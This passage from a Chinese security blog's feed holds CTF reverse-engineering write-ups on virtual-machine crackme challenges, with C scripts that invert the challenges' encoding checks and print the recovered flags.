input[i+1]。一直这样对所有的input加密2遍，就是使用op_data不同。</p><p>使用ida_python导出我们要用的op_data。</p><p>按照程序的算法，逆二次即可：第一次解密过程我进行了注释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a1[] = &#123;<span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">9</span>,</span><br><span class="line">  <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">13</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">12</span>,</span><br><span class="line">   <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">10</span>&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;<span class="number">3</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">228</span>, <span class="number">95</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">113</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">94</span>, <span class="number">2</span>, <span class="number">72</span>, <span class="number">105</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">14</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">123</span>, <span class="number">65</span>, <span class="number">135</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*int i = 0, j = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ida_chars[41] = 135;</span></span><br><span class="line"><span class="comment">for(j = 40; j &gt;= 0; j--)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] ^= ida_chars[j+1];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 255; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">unsigned char temp = i, temp1 = i;</span></span><br><span class="line"><span class="comment">unsigned char a = b[j];</span></span><br><span class="line"><span class="comment">while(1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">temp1 ^= a;</span></span><br><span class="line"><span class="comment">a &amp;= temp;</span></span><br><span class="line"><span class="comment">a *= 2;</span></span><br><span class="line"><span class="comment">temp = temp1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(a == 0)</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(temp == ida_chars[j])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] = i;</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 42; i++)</span></span><br><span class="line"><span class="comment">printf("%d, ", ida_chars[i]);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">c[<span class="number">41</span>] = <span class="number">125</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">40</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">c[j] ^= c[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i, temp1 = i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = a1[j];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp1 ^= a;</span><br><span class="line">a &amp;= temp;</span><br><span class="line">a *= <span class="number">2</span>;</span><br><span class="line">temp = temp1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp == c[j])</span><br><span class="line">&#123;</span><br><span class="line">c[j] = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, c[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;e1750505-7a05-4de9-a333-72ec8cd26a78&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ctfvm"><a href="#ctfvm" class="headerlink" title="ctfvm"></a>ctfvm</h3><p>从题目名字可知道是虚拟机逆向。在linux中运行一下，看见字符串信息。</p><p>ida中搜索一圈并没有发现任何相关字符串，那就是程序运行时解密出相关字符串。从入口点找到main函数，可以看到464行的代码，分支极其多。。<img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114224414324-1605451277740.png" alt="image-20201114224414324"></p><p>静态分析是不可能了，直接动调。</p><p>开始慢慢的调试看哪里解密字符串的，但实在是冗长，直接在while循环下断，然后F9一直跑，直到程序等待我们输入。</p><p>随便输入后，开始慢慢跟进熟悉一些函数的功能，发现开始就是在以此取我们输入的字符存入一个大数组中</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114225040904-1605451277740.png" alt="image-20201114225040904"></p><p>继续跟踪，分析到我们输入的字符长度要是38，虽然读取了最后的回车符，但是没有使用的。</p><p>其中程序中这个内存区域类似就是vm使用的寄存器。</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230655880-1605451277741.png" alt="image-20201114230655880"></p><p>接下来判断我们输入最后一位是不是 ‘}‘ 字符，再把除了flag{ }中的内容复制到与程序最后做比较的字符串的下面，</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230109551-1605451277741.png" alt="image-20201114230109551"></p><p>接着判断我们开始的5位是不是 flag{。</p><p>最后就是以此取出我们flag{}中每一位，<code>(0xFB*input[i])&amp;0xff</code>，然后以此与上面的比较字符串比较。解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">237</span>, <span class="number">6</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">232</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">11</span>, <span class="number">247</span>, <span class="number">247</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">27</span>, <span class="number">12</span>, <span class="number">252</span>, <span class="number">232</span>, <span class="number">12</span>, <span class="number">242</span>, <span class="number">22</span>, <span class="number">247</span>, <span class="number">2</span>, <span class="number">242</span>, <span class="number">17</span>, <span class="number">227</span>, <span class="number">227</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">247</span>, <span class="number">252</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i*<span class="number">0xFB</span>)&amp;<span class="number">0xff</span>) == a[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;72c149827155b27ad48d6b5f6c99fd54&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2个虚拟机类型的题目。当然，高兴的是进了线下，队伍最后第2名/。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>第九届全国电信和互联网行业网络安全管理技能竞赛</title>
    <link href="https://www.bxnop.cn/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/</id>
    <published>2020-11-07T08:34:10.000Z</published>
    <updated>2021-01-26T08:15:47.982Z</updated>
    
    <content type="html"><![CDATA[<p>在最后10分钟拿到这个题的二血，感觉还不错。<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106230503034.png" alt="image-20201106230503034"></p><p>从文件名字及程序中的字符串：<strong>runtime~</strong>可以知道这是一个go语言写的程序，然后使用IDAGolangHelper脚本还原程序的符号表。这下从函数名称可以极大的减少工作量。</p><p>找到main函数，简单分析一下可以知道这是一个虚拟机类型的题目：</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106210626460-1604738087809.png" alt="image-20201106210626460"></p><p>提取出opcode表：</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/2.png" alt="image-20201106210922720"></p><p>知道了操作码的功能，从7的数据个数可以知道我们要输入的字符长度是24，<strong>5 ~</strong>其实就是一个取下个数据值。然后对于code = 4,，1*1的操作虽然值没改变但其实在改变取数据index。而对于操作码5 1 4算是多余的类似花指令吧。如果对这个十分熟悉之后可以直接根据opcode和密文逆向flag的，但我还是调试单步调试来做的：</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/3.png" alt="image-20201106212942973"></p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/4.png" alt="image-20201106212508124"></p><p>整理了前面几个字符的笔记：后面还有对数据乘法加法的操作，直接调试着走就是。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[<span class="number">0</span>],input[<span class="number">1</span>] = -input[<span class="number">1</span>], input[<span class="number">2</span>] = -input[<span class="number">2</span>], input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>],</span><br><span class="line">f,l,a,g,&#123;I</span><br><span class="line">从开始的几个字符操作调试得出结果flag&#123;,又从input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>] == E1CA5h, 算出input[<span class="number">5</span>] = <span class="string">'I'</span></span><br></pre></td></tr></table></figure><p>这里有一个小技巧：调试时每次输入一个递增的数据，这样还在调试的dump窗口看我们的数据有没有变化。</p><p>最后调试完一遍得到flag：<strong>flag{I_am_the_last_one}</strong></p><p>赛后我也直接根据操作码走了一遍程序的流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">5</span>, <span class="number">1635</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2222</span>, <span class="number">8</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment">//7:input, 2:-, 3:+, 4:*</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在最后10分钟拿到这个题的二血，感觉还不错。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>反调试记录</title>
    <link href="https://www.bxnop.cn/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.bxnop.cn/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-05T08:50:08.000Z</published>
    <updated>2020-12-13T09:29:52.271Z</updated>
    
